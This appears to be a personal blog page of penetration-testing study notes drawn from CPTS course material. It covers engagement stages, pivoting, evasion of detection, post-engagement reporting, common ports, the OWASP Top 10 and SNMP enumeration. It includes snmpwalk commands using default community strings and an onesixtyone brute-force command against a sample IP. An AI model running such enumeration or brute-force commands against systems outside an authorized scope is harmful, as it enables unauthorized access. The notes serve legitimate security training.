<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Blogspot</title>

  <link rel="stylesheet" href="/css/main.css">
  
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Blogspot | c0derpwner BlogSpot</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Blogspot" />
<meta name="author" content="c0derpwnergit remote add origin" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="A Blog For Hackers" />
<meta property="og:description" content="A Blog For Hackers" />
<link rel="canonical" href="http://localhost:4000/Blogspot" />
<meta property="og:url" content="http://localhost:4000/Blogspot" />
<meta property="og:site_name" content="c0derpwner BlogSpot" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-04-08T00:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Blogspot" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"c0derpwnergit remote add origin","url":"https://ashishchaudhary.in/hacker-blog"},"dateModified":"2025-04-08T00:00:00+02:00","datePublished":"2025-04-08T00:00:00+02:00","description":"A Blog For Hackers","headline":"Blogspot","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Blogspot"},"url":"http://localhost:4000/Blogspot"}</script>
<!-- End Jekyll SEO tag -->

</head>

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <h1>c0derpwner@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/archive"><h2 class="header-link">Archive</h2></a>
<a href="/about"><h2 class="header-link">About</h2></a>
<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
    </div>
  </div>
</header>
    <div class="container">
      <section id="main_content">
        <article>
  <h2>Blogspot</h2>
  <time datetime="2025-04-08T00:00:00+02:00" class="by-line">08 Apr 2025</time>
  <p><img src="https://www.brunorochamoura.com/posts/cpts-tips/cover.png" alt="image" /></p>

<p>Stage   Description</p>
<ol>
  <li>Pre-Engagement   The first step is to create all the necessary documents in the pre-engagement phase, discuss the assessment objectives, and clarify any questions.</li>
  <li>Information Gathering  Once the pre-engagement activities are complete, we investigate the company’s existing website we have been assigned to assess. We identify the technologies in use and learn how the web application functions.</li>
  <li>Vulnerability Assessment   With this information, we can look for known vulnerabilities and investigate questionable features that may allow for unintended actions.</li>
  <li>Exploitation   Once we have found potential vulnerabilities, we prepare our exploit code, tools, and environment and test the webserver for these potential vulnerabilities.</li>
  <li>Post-Exploitation  Once we have successfully exploited the target, we jump into information gathering and examine the webserver from the inside. If we find sensitive information during this stage, we try to escalate our privileges (depending on the system and configurations).</li>
  <li>Lateral Movement   If other servers and hosts in the internal network are in scope, we then try to move through the network and access other hosts and servers using the information we have gathered.</li>
  <li>Proof-of-Concept   We create a proof-of-concept that proves that these vulnerabilities exist and potentially even automate the individual steps that trigger these vulnerabilities.</li>
  <li>Post-Engagement  Finally, the documentation is completed and presented to our client as a formal report deliverable. Afterward, we may hold a report walkthrough meeting to clarify anything about our testing or results and provide any needed support to personnel tasked with remediating our findings.</li>
</ol>

<h2 id="cpts-exam">CPTS-exam</h2>

<p>We will interact with more than <code class="language-plaintext highlighter-rouge">150 targets</code> during the Penetration Tester Job Role Path and perform nine simulated mini penetration tests, giving us plenty of opportunities to work on and practice this topic. Furthermore, operating system-specific modules should be considered from the pillaging point of view because much of what is shown in those modules can be used for information retrieval or privilege escalation on the target systems.</p>

<p>So pillaging Another essential step is Pillaging. After hitting the Post-Exploitation stage, pillaging is performed to collect sensitive information locally on the already exploited host, such as employee names, customer data, and much more. However, this information gathering only occurs after exploiting the target host and gaining access to it.</p>

<h2 id="mindset">mindset</h2>

<p>Other than the fact that this port is open, Nmap did not show us anything else. We must now ask ourselves what conclusions can be drawn from this result. Therefore, it does not matter which question we start with to make our conclusions. However, it is essential to ask <code class="language-plaintext highlighter-rouge">precise questions</code> and remember what we <code class="language-plaintext highlighter-rouge">know</code> and <code class="language-plaintext highlighter-rouge">do not know</code>. At this point, we must first ask ourselves what we <code class="language-plaintext highlighter-rouge">see</code> and what we actually <code class="language-plaintext highlighter-rouge">have</code>, because what we see is not the same as what we have:</p>

<ul>
  <li>
    <p>a <code class="language-plaintext highlighter-rouge">TCP</code> port <code class="language-plaintext highlighter-rouge">2121</code>. - <code class="language-plaintext highlighter-rouge">TCP</code> already means that this service is <code class="language-plaintext highlighter-rouge">connection-oriented</code>.</p>
  </li>
  <li>
    <p>Is this a <code class="language-plaintext highlighter-rouge">standard</code> port? - <code class="language-plaintext highlighter-rouge">No</code>, because these are between <code class="language-plaintext highlighter-rouge">0-1023</code>, aka well-known or <a href="https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml">system ports</a></p>
  </li>
  <li>
    <p>Are there any numbers in this <code class="language-plaintext highlighter-rouge">port number</code> that look <code class="language-plaintext highlighter-rouge">familiar</code>? - <code class="language-plaintext highlighter-rouge">Yes</code>, <code class="language-plaintext highlighter-rouge">TCP</code> port <code class="language-plaintext highlighter-rouge">21</code> (<code class="language-plaintext highlighter-rouge">FTP</code>). From our experience, we will get to know many standard ports and their services, which administrators often try to disguise, but often use “easy to remember” alternatives.</p>
  </li>
</ul>

<p>Based on our guess, we can try to connect to the service using <code class="language-plaintext highlighter-rouge">Netcat</code> or an <code class="language-plaintext highlighter-rouge">FTP</code> client and try to establish a connection to confirm or disprove our guess.</p>

<p>While connecting to the service, we noticed that the connection took longer than usual (about 15 seconds). There are some services whose connection speed, or response time, can be configured. Now that we know that an FTP server is running on this port, we can deduce the origin of our “failed” scan. We could confirm this again by specifying the minimum <code class="language-plaintext highlighter-rouge">probe round trip time</code> (<code class="language-plaintext highlighter-rouge">--min-rtt-timeout</code>) in Nmap to 15 or 20 seconds and rerunning the scan.</p>

<h2 id="pivoting">Pivoting</h2>

<p>In most cases, the system we use will not have the tools to enumerate the internal network efficiently. Some techniques allow us to use the exploited host as a proxy and perform all the scans from our attack machine or VM. In doing so, the exploited system represents and routes all our network requests sent from our attack machine to the internal network and its network components.</p>

<p>In this way, we make sure that non-routable networks (and therefore publicly unreachable) can still be reached. This allows us to scan them for vulnerabilities and penetrate deeper into the network. This process is also known as <code class="language-plaintext highlighter-rouge">Pivoting</code> or <code class="language-plaintext highlighter-rouge">Tunneling</code>.</p>

<p>An elementary example could be that we have a printer at home that is not accessible from the Internet, but we can send print jobs from our home network. If one of the hosts on our home network has been compromised, it could be leveraged to send these jobs to the printer. Though this is a simple (and unlikely) example, it illustrates the goal of <code class="language-plaintext highlighter-rouge">pivoting</code>, which is to access inaccessible systems via an intermediary system.</p>

<h2 id="evasive-testing">Evasive Testing</h2>

<p>Also, at this stage, we should consider whether evasive testing is part of the assessment scope. There are different procedures for each tactic, which support us in disguising these requests to not trigger an internal alarm among the administrators and the blue team.</p>

<p>There are many ways to protect against lateral movement, including network (micro) <code class="language-plaintext highlighter-rouge">segmentation</code>, <code class="language-plaintext highlighter-rouge">threat monitoring</code>, <code class="language-plaintext highlighter-rouge">IPS</code>/<code class="language-plaintext highlighter-rouge">IDS</code>, <code class="language-plaintext highlighter-rouge">EDR</code>, etc. To bypass these efficiently, we need to understand how they work and what they respond to. Then we can adapt and apply methods and strategies that help avoid detection.</p>

<h1 id="post-engagement">Post-Engagement</h1>

<p>Much like there is considerable legwork before an engagement officially starts (when testing begins), we must perform many activities (many of them contractually binding) after our scans, exploitation, lateral movement, and post-exploitation activities are complete. No two engagements are the same, so these activities may differ slightly but generally must be performed to close out an engagement fully.</p>

<p>![[0-PT-Process.png]]</p>

<hr />

<h2 id="cleanup">Cleanup</h2>

<p>Once testing is complete, we should perform any necessary cleanup, such as deleting tools/scripts uploaded to target systems, reverting any (minor) configuration changes we may have made, etc. We should have detailed notes of all of our activities, making any cleanup activities easy and efficient. If we cannot access a system where an artifact needs to be deleted, or another change reverted, we should alert the client and list these issues in the report appendices. Even if we can remove any uploaded files and revert changes (such as adding a local admin account), we should document these changes in our report appendices in case the client receives alerts that they need to follow up on and confirm that the activity in question was part of our sanctioned testing.</p>

<hr />

<h2 id="documentation-and-reporting">Documentation and Reporting</h2>

<p>Before completing the assessment and disconnecting from the client’s internal network or sending “stop” notification emails to signal the end of testing (meaning no more interaction with the client’s hosts), we must make sure to have adequate documentation for all findings that we plan to include in our report. This includes command output, screenshots, a listing of affected hosts, and anything else specific to the client environment or finding. We should also make sure that we have retrieved all scan and log output if the client hosted a VM in their infrastructure for an internal penetration test and any other data that may be included as part of the report or as supplementary documentation. We should not keep any Personal Identifiable Information (PII), potentially incriminating info, or other sensitive data we came across throughout testing.</p>

<p>We should already have a detailed list of the findings we will include in the report and all necessary details to tailor the findings to the client’s environment. Our report deliverable (which is covered in detail in the <a href="https://academy.hackthebox.com/module/details/162">Documentation &amp; Reporting</a> module) should consist of the following:</p>

<ul>
  <li>An attack chain (in the event of full internal compromise or external to internal access) detailing steps taken to achieve compromise</li>
  <li>A strong executive summary that a non-technical audience can understand</li>
  <li>Detailed findings specific to the client’s environment that include a risk rating, finding impact, remediation recommendations, and high-quality external references related to the issue</li>
  <li>Adequate steps to reproduce each finding so the team responsible for remediation can understand and test the issue while putting fixes in place</li>
  <li>Near, medium, and long-term recommendations specific to the environment</li>
  <li>Appendices which include information such as the target scope, OSINT data (if relevant to the engagement), password cracking analysis (if relevant), discovered ports/services, compromised hosts, compromised accounts, files transferred to client-owned systems, any account creation/system modifications, an Active Directory security analysis (if relevant), relevant scan data/supplementary documentation, and any other information necessary to explain a specific finding or recommendation further</li>
</ul>

<p>At this stage, we will create a draft report that is the first deliverable our client will receive. From here, they will be able to comment on the report and ask for any necessary clarification/modifications.</p>

<hr />

<h2 id="report-review-meeting">Report Review Meeting</h2>

<p>Once the draft report is delivered, and the client has had a chance to distribute it internally and review it in-depth, it is customary to hold a report review meeting to walk through the assessment results. The report review meeting typically includes the same folks from the client and the firm performing the assessment. Depending on the types of findings, the client may bring in additional technical subject matter experts if the finding is related to a system or application they are responsible for. Typically we will not read the entire report word for word but walk through each finding briefly and give an explanation from our own perspective/experience. The client will have the opportunity to ask questions about anything in the report, ask for clarifications, or point out issues that need to be corrected. Often the client will come with a list of questions about specific findings and will not want to cover every finding in detail (such as low-risk ones).</p>

<hr />

<h2 id="deliverable-acceptance">Deliverable Acceptance</h2>

<p>The Scope of Work should clearly define the acceptance of any project deliverables. In penetration test assessments, generally, we deliver a report marked <code class="language-plaintext highlighter-rouge">DRAFT</code> and give the client a chance to review and comment. Once the client has submitted feedback (i.e., management responses, requests for clarification/changes, additional evidence, etc.) either by email or (ideally) during a report review meeting, we can issue them a new version of the report marked <code class="language-plaintext highlighter-rouge">FINAL</code>. Some audit firms that clients may be beholden to will not accept a penetration test report with a <code class="language-plaintext highlighter-rouge">DRAFT</code> designation. Other companies will not care, but keeping a uniform approach across all customers is best.</p>

<hr />

<h2 id="post-remediation-testing">Post-Remediation Testing</h2>

<p>Most engagements include post-remediation testing as part of the project’s total cost. In this phase, we will review any documentation provided by the client showing evidence of remediation or just a list of remediated findings. We will need to reaccess the target environment and test each issue to ensure it was appropriately remediated. We will issue a post-remediation report that clearly shows the state of the environment before and after post-remediation testing. For example, we may include a table such as:</p>

<table>
  <thead>
    <tr>
      <th>#</th>
      <th>Finding Severity</th>
      <th>Finding Title</th>
      <th>Status</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>High</td>
      <td>SQL Injection</td>
      <td>Remediated</td>
    </tr>
    <tr>
      <td>2</td>
      <td>High</td>
      <td>Broken Authentication</td>
      <td>Remediated</td>
    </tr>
    <tr>
      <td>3</td>
      <td>High</td>
      <td>Unrestricted File Upload</td>
      <td>Remediated</td>
    </tr>
    <tr>
      <td>4</td>
      <td>High</td>
      <td>Inadequate Web and Egress Filtering</td>
      <td>Not Remediated</td>
    </tr>
    <tr>
      <td>5</td>
      <td>Medium</td>
      <td>SMB Signing Not Enabled</td>
      <td>Not Remediated</td>
    </tr>
    <tr>
      <td>6</td>
      <td>Low</td>
      <td>Directory Listing Enabled</td>
      <td>Not Remediated</td>
    </tr>
  </tbody>
</table>

<p>For each finding (where possible), we will want to show evidence that the issue is no longer present in the environment through scan output or proof that the original exploitation techniques fail.</p>

<hr />

<h2 id="role-of-the-pentester-in-remediation">Role of the Pentester in Remediation</h2>

<p>Since a penetration test is essentially an audit, we must remain impartial third parties and not perform remediation on our findings (such as fixing code, patching systems, or making configuration changes in Active Directory). We must maintain a degree of independence and can serve as trusted advisors by giving general remediation advice on how a specific issue could be fixed or be available to explain further/demonstrate a finding so the team assigned to remediate it has a better understanding. We should not be implementing changes ourselves or even giving precise remediation advice (i.e., for SQL Injection, we may say “sanitize user input” but not give the client a rewritten piece of code). This will help maintain the assessment’s integrity and not introduce any potential conflict of interest into the process.</p>

<hr />

<h2 id="data-retention">Data Retention</h2>

<p>After a penetration test concludes, we will have a considerable amount of client-specific data such as scan results, log output, credentials, screenshots, and more. Data retention and destruction requirements may differ from country to country and firm to firm, and procedures surrounding each should be outlined clearly in the contract language of the Scope of Work and the Rules of Engagement. Per <a href="https://www.pcisecuritystandards.org/documents/Penetration_Testing_Guidance_March_2015.pdf">Penetration Testing Guidance</a> from the PCI Data Security Standard (PCI DSS):</p>

<p>“While there are currently no PCI DSS requirements regarding the retention of evidence collected by the penetration tester, it is a recommended best practice that the tester retain such evidence (whether internal to the organization or a third-party provider) for a period of time while considering any local, regional, or company laws that must be followed for the retention of evidence. This evidence should be available upon request from the target entity or other authorized entities as defined in the rules of engagement.”</p>

<p>We should retain evidence for some time after the penetration test in case questions arise about specific findings or to assist with retesting “closed” findings after the client has performed remediation activities. Any data retained after the assessment should be stored in a secure location owned and controlled by the firm and encrypted at rest. All data should be wiped from tester systems at the conclusion of an assessment. A new virtual machine specific to the client in question should be created for any post-remediation testing or investigation of findings related to client inquiries.</p>

<hr />

<h2 id="close-out">Close Out</h2>

<p>Once we have delivered the final report, assisted the client with questions regarding remediation, and performed post-remediation testing/issued a new report, we can finally close the project. At this stage, we should ensure that any systems used to connect to the client’s systems or process data have been wiped or destroyed and that any artifacts leftover from the engagement are stored securely (encrypted) per our firm’s policy and per contractual obligations to our client. The final steps would be invoicing the client and collecting payment for services rendered. Finally, it is always good to follow up with a post-assessment client satisfaction survey so the team and management, in particular, can see what went well during the engagement and what could be improved upon from a company process standpoint and the individual consultant assigned to the project. Discussions for follow-on work may arise in the weeks or months after if the client was pleased with our work and day-to-day interactions.</p>

<p>As we continually grow our technical skillset, we should always look for ways to improve our soft skills and become more well-rounded professional consultants. In the end, the <code class="language-plaintext highlighter-rouge">client will usually remember interactions</code> during the assessment, communication, and how they were treated/valued by the firm they engage, <code class="language-plaintext highlighter-rouge">not the fancy exploit chain the pentester pulled off to pwn their systems</code>. Take this time to self-reflect and work on continuous improvement in all aspects of your role as a professional penetration tester.</p>

<h1 id="connecting-using-vpn">Connecting Using VPN</h1>

<hr />
<p>#vpn #openvpn</p>

<p>A <a href="https://en.wikipedia.org/wiki/Virtual_private_network">virtual private network (VPN)</a> allows us to connect to a private (internal) network and access hosts and resources as if we were directly connected to the target private network. It is a secured communications channel over shared public networks to connect to a private network (i.e., an employee remotely connecting to their company’s corporate network from their home). VPNs provide a degree of privacy and security by encrypting communications over the channel to prevent eavesdropping and access to data traversing the channel.![[vpn.png]]</p>

<p>We can use a VPN service such as <code class="language-plaintext highlighter-rouge">NordVPN</code> or <code class="language-plaintext highlighter-rouge">Private Internet Access</code> and connect to a VPN server in another part of our country or another region of the world to obscure our browsing traffic or disguise our public IP address. This can provide us with some level of security and privacy. Still, since we are connecting to a company’s server, there is always the chance that data is being logged or the VPN service is not following security best practices or the security features that they advertise. Using a VPN service comes with the risk that the provider is not doing what they are saying and are logging all data. Usage of a VPN service <strong>does not</strong> guarantee anonymity or privacy but is useful for bypassing certain network/firewall restrictions or when connected to a possible hostile network (i.e., a public airport wireless network). A VPN service should never be used with the thought that it will protect us from the consequences of performing nefarious activities.</p>

<p>Connecting Using VPN</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>openvpn user.ovpn

Thu Dec 10 18:42:41 2020 OpenVPN 2.4.9 x86_64-pc-linux-gnu <span class="o">[</span>SSL <span class="o">(</span>OpenSSL<span class="o">)]</span> <span class="o">[</span>LZO] <span class="o">[</span>LZ4] <span class="o">[</span>EPOLL] <span class="o">[</span>PKCS11] <span class="o">[</span>MH/PKTINFO] <span class="o">[</span>AEAD] built on Apr 21 2020
Thu Dec 10 18:42:41 2020 library versions: OpenSSL 1.1.1g  21 Apr 2020, LZO 2.10
Thu Dec 10 18:42:41 2020 Outgoing Control Channel Authentication: Using 256 bit message <span class="nb">hash</span> <span class="s1">'SHA256'</span> <span class="k">for </span>HMAC authentication
Thu Dec 10 18:42:41 2020 Incoming Control Channel Authentication: Using 256 bit message <span class="nb">hash</span> <span class="s1">'SHA256'</span> <span class="k">for </span>HMAC authentication
Thu Dec 10 18:42:41 2020 TCP/UDP: Preserving recently used remote address: <span class="o">[</span>AF_INET]
Thu Dec 10 18:42:41 2020 Socket Buffers: <span class="nv">R</span><span class="o">=[</span>212992-&gt;212992] <span class="nv">S</span><span class="o">=[</span>212992-&gt;212992]
Thu Dec 10 18:42:41 2020 UDP <span class="nb">link local</span>: <span class="o">(</span>not bound<span class="o">)</span>
&lt;SNIP&gt;
Thu Dec 10 18:42:41 2020 Initialization Sequence Completed
</code></pre></div></div>

<h2 id="what-is-a-port">What is a Port?</h2>

<p>A <a href="https://en.wikipedia.org/wiki/Port_\(computer_networking\)">port</a> can be thought of as a window or door on a house (the house being a remote system), if a window or door is left open or not locked correctly, we can often gain unauthorized access to a home. This is similar in computing. Ports are virtual points where network connections begin and end. They are software-based and managed by the host operating system. Ports are associated with a specific process or service and allow computers to differentiate between different traffic types (SSH traffic flows to a different port than web requests to access a website even though the access requests are sent over the same network connection).</p>

<p>Each port is assigned a number, and many are standardized across all network-connected devices (though a service can be configured to run on a non-standard port). For example, <code class="language-plaintext highlighter-rouge">HTTP</code> messages (website traffic) typically go to port <code class="language-plaintext highlighter-rouge">80</code>, while <code class="language-plaintext highlighter-rouge">HTTPS</code> messages go to port <code class="language-plaintext highlighter-rouge">443</code> unless configured otherwise. We will encounter web applications running on non-standard ports but typically find them on ports 80 and 443. Port numbers allow us to access specific services or applications running on target devices. At a very high level, ports help computers understand how to handle the various types of data they receive.</p>

<p>There are two categories of ports, <a href="https://en.wikipedia.org/wiki/Transmission_Control_Protocol">Transmission Control Protocol (TCP)</a>, and <a href="https://en.wikipedia.org/wiki/User_Datagram_Protocol">User Datagram Protocol (UDP)</a>.<br />
<code class="language-plaintext highlighter-rouge">TCP</code> is connection-oriented, meaning that a connection between a client and a server must be established before data can be sent. The server must be in a listening state awaiting connection requests from clients.<br />
<code class="language-plaintext highlighter-rouge">UDP</code> utilizes a connectionless communication model. There is no “handshake” and therefore introduces a certain amount of unreliability since there is no guarantee of data delivery. <code class="language-plaintext highlighter-rouge">UDP</code> is useful when error correction/checking is either not needed or is handled by the application itself. <code class="language-plaintext highlighter-rouge">UDP</code> is suitable for applications that run time-sensitive tasks since dropping packets is faster than waiting for delayed packets due to retransmission, as is the case with <code class="language-plaintext highlighter-rouge">TCP</code> and can significantly affect a real-time system. There are <code class="language-plaintext highlighter-rouge">65,535</code> <code class="language-plaintext highlighter-rouge">TCP</code> ports and <code class="language-plaintext highlighter-rouge">65,535</code> different <code class="language-plaintext highlighter-rouge">UDP</code> ports, each denoted by a number. Some of the most well-known <code class="language-plaintext highlighter-rouge">TCP</code> and <code class="language-plaintext highlighter-rouge">UDP</code> ports are listed below:</p>

<table>
  <thead>
    <tr>
      <th>Port(s)</th>
      <th>Protocol</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">20</code>/<code class="language-plaintext highlighter-rouge">21</code> (TCP)</td>
      <td><code class="language-plaintext highlighter-rouge">FTP</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">22</code> (TCP)</td>
      <td><code class="language-plaintext highlighter-rouge">SSH</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">23</code> (TCP)</td>
      <td><code class="language-plaintext highlighter-rouge">Telnet</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">25</code> (TCP)</td>
      <td><code class="language-plaintext highlighter-rouge">SMTP</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">80</code> (TCP)</td>
      <td><code class="language-plaintext highlighter-rouge">HTTP</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">161</code> (TCP/UDP)</td>
      <td><code class="language-plaintext highlighter-rouge">SNMP</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">389</code> (TCP/UDP)</td>
      <td><code class="language-plaintext highlighter-rouge">LDAP</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">443</code> (TCP)</td>
      <td><code class="language-plaintext highlighter-rouge">SSL</code>/<code class="language-plaintext highlighter-rouge">TLS</code> (<code class="language-plaintext highlighter-rouge">HTTPS</code>)</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">445</code> (TCP)</td>
      <td><code class="language-plaintext highlighter-rouge">SMB</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">3389</code> (TCP)</td>
      <td><code class="language-plaintext highlighter-rouge">RDP</code></td>
    </tr>
  </tbody>
</table>

<p>As information security professionals, we must be able to quickly recall large amounts of information on a wide variety of topics. It is essential for us, especially as pentesters, to have a firm grasp of many <code class="language-plaintext highlighter-rouge">TCP</code> and <code class="language-plaintext highlighter-rouge">UDP</code> ports and be able to recognize them from just their number quickly (i.e., know that port <code class="language-plaintext highlighter-rouge">21</code> is <code class="language-plaintext highlighter-rouge">FTP</code>, port <code class="language-plaintext highlighter-rouge">80</code> is <code class="language-plaintext highlighter-rouge">HTTP</code>, port <code class="language-plaintext highlighter-rouge">88</code> is <code class="language-plaintext highlighter-rouge">Kerberos</code>) without having to look it up. This will come with practice and repetition and eventually become second nature as we attack more boxes, labs, and real-world networks and help us work more efficiently and better prioritize our enumeration efforts and attacks.</p>

<p>Guides such as <a href="https://www.stationx.net/common-ports-cheat-sheet/">this</a> and <a href="https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf">this</a> are great resources for learning standard and less common TCP and UDP ports. Challenge yourself to memorize as many of these as possible and do some research about each of the protocols listed in the table above. This is a great <a href="https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/">reference</a> on the top 1,000 <code class="language-plaintext highlighter-rouge">TCP</code> and <code class="language-plaintext highlighter-rouge">UDP</code> ports from <code class="language-plaintext highlighter-rouge">nmap</code> along with the top 100 services scanned by <code class="language-plaintext highlighter-rouge">nmap</code>.</p>

<h2 id="what-is-a-web-server">What is a Web Server</h2>

<p>A web server is an application that runs on the back-end server, which handles all of the <code class="language-plaintext highlighter-rouge">HTTP</code> traffic from the client-side browser, routes it to the requests destination pages, and finally responds to the client-side browser. Web servers usually run on TCP ports <code class="language-plaintext highlighter-rouge">80</code> or <code class="language-plaintext highlighter-rouge">443</code>, and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses:</p>

<p>Many types of vulnerabilities can affect web applications. We will often hear about/see references to the <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a>. This is a standardized list of the top 10 web application vulnerabilities maintained by the Open Web Application</p>

<table>
  <thead>
    <tr>
      <th>Number</th>
      <th>Category</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1.</td>
      <td><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Broken Access Control</a></td>
      <td>Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc.</td>
    </tr>
    <tr>
      <td>2.</td>
      <td><a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Cryptographic Failures</a></td>
      <td>Failures related to cryptography which often leads to sensitive data exposure or system compromise.</td>
    </tr>
    <tr>
      <td>3.</td>
      <td><a href="https://owasp.org/Top10/A03_2021-Injection/">Injection</a></td>
      <td>User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc.</td>
    </tr>
    <tr>
      <td>4.</td>
      <td><a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Insecure Design</a></td>
      <td>These issues happen when the application is not designed with security in mind.</td>
    </tr>
    <tr>
      <td>5.</td>
      <td><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Security Misconfiguration</a></td>
      <td>Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information.</td>
    </tr>
    <tr>
      <td>6.</td>
      <td><a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Vulnerable and Outdated Components</a></td>
      <td>Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date.</td>
    </tr>
    <tr>
      <td>7.</td>
      <td><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Identification and Authentication Failures</a></td>
      <td>Authentication-related attacks that target user’s identity, authentication, and session management.</td>
    </tr>
    <tr>
      <td>8.</td>
      <td><a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Software and Data Integrity Failures</a></td>
      <td>Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs).</td>
    </tr>
    <tr>
      <td>9.</td>
      <td><a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">Security Logging and Monitoring Failures</a></td>
      <td>This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected..</td>
    </tr>
    <tr>
      <td>10.</td>
      <td><a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">Server-Side Request Forgery</a></td>
      <td>SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).</td>
    </tr>
  </tbody>
</table>

<p>It is essential to become familiar with each of these categories and the various vulnerabilities that fit each.</p>

<hr />

<h2 id="editor-vim">Editor Vim</h2>

<p>basic and common flags to exit / save / delate / sym</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">x</code></td>
      <td>Cut character</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">dw</code></td>
      <td>Cut word</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">dd</code></td>
      <td>Cut full line</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">yw</code></td>
      <td>Copy word</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">yy</code></td>
      <td>Copy full line</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">p</code></td>
      <td>Paste</td>
    </tr>
  </tbody>
</table>

<p>There are many commands available to us. The following are some of them:</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">:1</code></td>
      <td>Go to line number 1.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">:w</code></td>
      <td>Write the file, save</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">:q</code></td>
      <td>Quit</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">:q!</code></td>
      <td>Quit without saving</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">:wq</code></td>
      <td>Write and quit</td>
    </tr>
  </tbody>
</table>

<hr />

<p>#Service #snmp #snmpwalk #onesixtyone</p>
<h4 id="snmp">SNMP</h4>

<p>SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of <code class="language-plaintext highlighter-rouge">public</code> and <code class="language-plaintext highlighter-rouge">private</code> are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.</p>

<p>Service Scanning</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmpwalk <span class="nt">-v</span> 2c <span class="nt">-c</span> public &lt;ip&gt; 
snmpwalk <span class="nt">-v</span> 2c <span class="nt">-c</span> private  &lt;ip&gt;
onesixtyone <span class="nt">-c</span> /home/nullbyte/SecLists/snmp_dict.txt 10.129.42.254
</code></pre></div></div>

<p>A tool such as onesixtyone can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool</p>

<hr />

<h1 id="web-enumeration">Web Enumeration</h1>

<p>#DirectoryEnumeration #fuzz #webcontent #webapp</p>

<p>When performing service scanning, we will often run into web servers running on ports 80 and 443. Webservers host web applications (sometimes more than 1) which often provide a considerable attack surface and a very high-value target during a penetration test. Proper web enumeration is critical, especially when an organization is not exposing many services or those services are appropriately patched.</p>

